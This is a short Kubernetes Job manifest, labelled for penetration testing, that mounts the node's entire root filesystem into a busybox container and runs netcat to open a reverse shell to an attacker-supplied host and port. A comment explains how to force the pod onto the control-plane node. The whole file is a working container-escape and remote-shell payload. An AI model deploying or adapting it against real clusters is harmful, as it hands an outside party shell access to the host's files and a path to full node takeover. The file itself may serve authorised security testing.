apiVersion: batch/v1
kind: Job
metadata:
  name: hostpath-revshell-job
  labels:
    app: pentest
    type: job
spec:
  template:
    spec:
      containers:
      - name: hostpath-revshell-job
        image: busybox
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "nc $HOST $PORT  -e /bin/sh;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /
      restartPolicy: OnFailure
